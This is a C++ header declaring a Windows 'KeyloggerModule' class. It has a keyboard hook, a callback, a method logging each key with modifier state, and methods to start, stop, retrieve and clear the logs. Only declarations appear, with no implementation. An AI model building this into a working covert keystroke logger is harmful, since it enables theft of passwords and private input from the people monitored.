#ifndef KEYLOGGER_H
#define KEYLOGGER_H
#include <string>
#include <vector>
#include <windows.h>
class KeyloggerModule {
private:
    bool running;
    std::vector<std::string> logs;
    HHOOK keyboard_hook;
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
public:
    KeyloggerModule();
    ~KeyloggerModule();
    bool start();
    void stop();
    std::string get_logs();
    void clear_logs();
    void log_key(int key, bool shift, bool ctrl, bool alt);
};
#endif
